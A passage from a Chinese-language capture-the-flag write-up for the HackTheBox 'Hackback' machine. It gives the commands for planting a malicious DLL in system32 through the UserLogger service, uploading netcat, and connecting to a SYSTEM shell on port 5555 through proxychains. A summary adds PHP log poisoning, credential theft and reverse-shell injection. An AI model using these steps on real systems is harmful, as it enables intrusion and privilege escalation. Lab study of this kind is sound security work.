+![](https://image.3001.net/images/20220224/1645668479_6216e87f603d9e8e1be23.png!small)但是显示进入失败，说明恶意dll文件未上传到`C:\windows\system32\`目录下，查看
+mac.log
+
+    
+    
+    ls c:\windows\system32 | findstr mac
+    
+
+![](https://image.3001.net/images/20220224/1645668480_6216e880a65492be29fcc.png!small)  
+在其中未直接生成log文件，观看 appsec 视频说是需要使用`Invoke-Expression`来完成写入
+
+    
+    
+    Invoke-Expression "sc.exe start UserLogger C:\windows\system32\mac"
+    
+
+但是我还是没写入到`C:\windows\system32\`目录中，原来是nc的运行位数搞错了，需要上传64位的nc
+
+    
+    
+    UPLOAD /root/hackthebox/Machines/Hackback/nc64.exe C:\Windows\system32\spool\drivers\color\nc.exe
+    
+
+再次执行可以看到 mac.log  
+![](https://image.3001.net/images/20220224/1645668481_6216e881d3a343812ca26.png!small)接下来就是将恶意dll程序复制到`C:\windows\system32\`目录并重命名为mac.log，然后执行运行exp程序即可
+
+    
+    
+    copy C:\Windows\system32\spool\drivers\color\FakeDll.dll C:\windows\system32\mac.log
+    C:\Windows\system32\spool\drivers\color\mac.exe mac.log
+    
+
+查看本地端口开放情况，如果开放了5555端口那么说明exp利用成功  
+![](https://image.3001.net/images/20220224/1645668483_6216e883997bf7d331305.png!small)
+
+最后通过代理连接可获取到system
+
+    
+    
+    proxychains nc 10.10.10.128 5555
+    
+
+![](https://image.3001.net/images/20220224/1645668484_6216e884e1cd728b61542.png!small)通过
+ntfs 数据流获取flag
+
+    
+    
+    dir c:\users\administrator\Desktop /a /r
+    cd c:\users\administrator\Desktop
+    powershell -c Get-Content -stream root.txt:flag.txt
+    
+
+![](https://image.3001.net/images/20220224/1645668486_6216e8865e4f0c8d5fefc.png!small)
+
+## **总结**
+
+在一系列钓鱼网站中找到管理员登陆界面，通过js代码分析发现登陆接口存在php日志中毒，在参数中插入php代码会成功执行，通过日志可以查看执行结果。通过该漏洞读取web.config.old，其中存在系统用户的账号密码，通过WinRM登陆用户，在靶机中的隐藏文件夹里找到ps以及对应配置ini，修改配置ini文件插入反弹命令完成命令注入从而完成权限提升。分析UserLogger服务借助NTFS数据流能够成功读取flag，可制作恶意dll放入系统路径并加载diaghub帮助我们执行bat文件中的命令，最终成功获取系统权限。该靶机的主要难点还是在于php日志中毒和UserLogger服务。
+
